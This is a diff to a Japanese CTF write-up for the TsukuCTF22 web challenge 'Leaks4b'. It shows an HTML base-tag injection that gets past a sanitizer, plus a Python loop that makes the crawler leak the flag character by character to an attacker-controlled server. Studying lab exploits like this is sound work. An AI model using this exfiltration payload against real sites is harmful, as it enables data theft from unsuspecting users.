@@ -24,7 +24,7 @@ URLとソースが渡される。
 ![site1.png](images/site1.png)  
 クローラが設置されており、パティシエが閲覧してくれるようだ。  
 ![site2.png](images/site2.png)  
-ひとまず配布されたソースapp.pyを見ると、以下のようであった。  
+ひとまず配布されたソースのapp.pyを見ると、以下のようであった。  
 ```python
 ~~~
 def cssi_sanitizer(text):
@@ -37,9 +37,7 @@ def cssi_sanitizer(text):
 
 menu = ["チョコレートケーキ, チョコケーキ, chocolatecake", "チーズケーキ, cheesecake", "バナナケーキ, bananacake"]
 
-@app.route("/<path:path>")
-def missing_handler(path):
-    abort(404, "ページが見つかりません。\nごめんね(^^♪")
+~~~
 
 @app.route("/")
 def top():
@@ -67,8 +65,10 @@ def top():
     <meta http-equiv="Content-Security-Policy" content="script-src 'nonce-{nonce}'; base-uri 'none'; connect-src 'none'; font-src 'none'; form-action 'none'; frame-src 'none'; object-src 'none'; require-trusted-types-for 'script'; worker-src 'none';">
     <script src="https://cdn.tailwindcss.com" nonce="{nonce}"></script>
     <title>Leaks4b</title>
+</head>
 ~~~
-
+"""
+~~~
 @app.route("/order", methods=["POST"])
 def order_post():
     url = request.form.get("url", "____")
@@ -105,7 +105,7 @@ imgの画像ファイル名は検索結果によって異なるためクロー�
 あとはフラグに一致する正規表現とbaseタグをcssi_sanitizerを躱してクエリに設定してやればよい。  
 フラグの`TsukuCTF22{`リークするクエリは以下になる。  
 ```
-http://http://133.130.96.134:31416/?cake=.suku...22.|%3Cbase%20href=//[自身のサーバ]%3E
+http://133.130.96.134:31416/?cake=.suku...22.|%3Cbase%20href=//[自身のサーバ]%3E
 ```
 baseタグは`|`で設定し、特殊文字と小文字化に注意する(フラグの`{`などは`.`を利用して任意の一文字として埋めてやればよい)。  
 リークが行えることがわかったら、`/static/img/flag0.jpg`が来るまで小文字すべてをクローラへ投げてやり、ヒットしたらフラグ文字列に追加し次の文字を探せばよい。  
@@ -122,6 +122,6 @@ for c in "abcdefghijklmnopqrstuvwxyz.":
     res = requests.post(f"{TARGET_URL}/order", data={"url": f"{TARGET_URL}/?cake={FLAG}{c}|%3Cbase%20href={LEAK_URL}%3E"})
     print(res.text)
 ```
-実行し、手動でリークした文字を追加していくとflagが得られた(自動化もできる)。  
+実行し、手動でリークした文字を追加していくとflagが得られた(自動化もできるが手動でも可能なようなflagになっている)。  
 
 ## TsukuCTF22{cakeuma}
